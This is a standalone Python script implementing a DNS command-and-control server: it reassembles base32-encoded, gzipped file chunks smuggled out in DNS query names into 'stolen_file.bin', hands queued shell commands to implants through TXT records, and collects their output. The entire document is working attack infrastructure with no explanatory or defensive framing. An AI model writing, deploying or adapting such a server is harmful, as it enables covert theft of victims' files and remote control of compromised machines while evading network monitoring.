python
from dnslib.server import DNSServer, BaseResolver
from dnslib import DNSRecord, RR, QTYPE, A, TXT
import base64, gzip, os

CHUNKS = {}
RESULT_CHUNKS = {}
OUTPUT_FILE = "stolen_file.bin"

def load_commands():
    try:
        with open('commands.txt', 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return ["whoami"]

COMMAND_QUEUE = load_commands()

class C2Resolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.get_qname()).rstrip('.')
        labels = qname.split('.')
        
        reply = request.reply()
        reply.header.rcode = 3

        # --- 1. EXFILTRATION ---
        if len(labels) >= 4 and labels[-3] == "data":
            chunk = labels[0]
            seqno = labels[1]
            if chunk == "END":
                self.reassemble_file(int(seqno))
            else:
                CHUNKS[int(seqno)] = chunk
            return reply

        # --- 2. C2 COMMAND POLLING ---
        if labels[0] == "poll":
            reply.header.rcode = 0
            if COMMAND_QUEUE:
                cmd = COMMAND_QUEUE.pop(0)
                reply.add_answer(RR(
                    rname=request.q.qname, rtype=QTYPE.TXT, rdata=TXT(f"RUN: {cmd}")
                ))
            else:
                reply.add_answer(RR(
                    rname=request.q.qname, rtype=QTYPE.TXT, rdata=TXT("NOOP")
                ))
            return reply

        # --- 3. C2 RESULT RECEIVING ---
        if len(labels) >= 3 and labels[-2] == "result":
            chunk = labels[0]
            seqno = labels[1]
            if chunk == "END":
                total = int(seqno)
                data = ""
                for i in range(total):
                    data += RESULT_CHUNKS.get(i, "")
                try:
                    decoded = base64.b32decode(data).decode()
                    with open("final_output.txt", "a") as f:
                        f.write(decoded + "\n")
                except:
                    pass
                RESULT_CHUNKS.clear()
            else:
                RESULT_CHUNKS[int(seqno)] = chunk
            return reply

        return reply

    def reassemble_file(self, total):
        if len(CHUNKS) < total:
            return
        data = ""
        for i in range(total):
            data += CHUNKS.get(i, "")
        try:
            decoded = base64.b32decode(data)
            original = gzip.decompress(decoded)
            with open(OUTPUT_FILE, 'wb') as f:
                f.write(original)
            print(f"[✓] File reassembled: {OUTPUT_FILE} ({len(original)} bytes)")
        except:
            pass
        CHUNKS.clear()

resolver = C2Resolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
print("[*] C2 DNS Server running...")
server.start()
